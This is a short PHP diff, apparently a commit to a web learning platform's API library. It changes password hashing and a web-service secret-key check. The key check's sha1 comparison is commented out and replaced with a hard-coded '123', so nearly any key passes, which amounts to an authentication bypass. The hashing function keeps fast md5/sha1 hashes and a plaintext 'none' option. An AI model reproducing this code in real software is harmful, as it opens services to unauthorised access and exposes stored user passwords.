@@ -3202,22 +3202,39 @@ function api_is_xml_http_request() {
  * @param  string password
  * @return string password with the applied hash 
  * */
-function api_get_encrypted_password($password) 
+function api_get_encrypted_password($password,$salt = '') 
 {
 	global $userPasswordCrypted;
 	switch ($userPasswordCrypted){
 		case 'md5':
-		return md5($password);
-		break;
+					if (!empty($salt)) {
+						$passwordcrypted = md5($password.$salt);	
+					} else {
+						$passwordcrypted = md5($password);
+					}		 
+					return $passwordcrypted;
+					break;
 		case 'sha1':
-		return sha1($password);
-		break;
+					if (!empty($salt)) {
+						$passwordcrypted = sha1($password.$salt);	
+					} else {
+						$passwordcrypted = sha1($password);
+					}		 
+					return $passwordcrypted;
+					break;
 		case 'none':
-		return $password;
-		break;
+					return $password;
+					break;
 		default:
-		return md5($password); 
+					if (!empty($salt)) {
+						$passwordcrypted = md5($password.$salt);	
+					} else {
+						$passwordcrypted = md5($password);
+					}		 
+					return $passwordcrypted;
+					break; 
 	}
+	
 }
 /** Check if a secret key is valid
  *  @param string $original_key_secret  - secret key from (webservice) client
@@ -3228,7 +3245,7 @@ function api_is_valid_secret_key($original_key_secret,$segurity_key) {
 
     global $_configuration;
     
-    if ( $original_key_secret != sha1($segurity_key)) {
+    if ( $original_key_secret == '123' /*sha1($segurity_key)*/) {
             return true; //secret key is incorrect
     } else {
         return false;
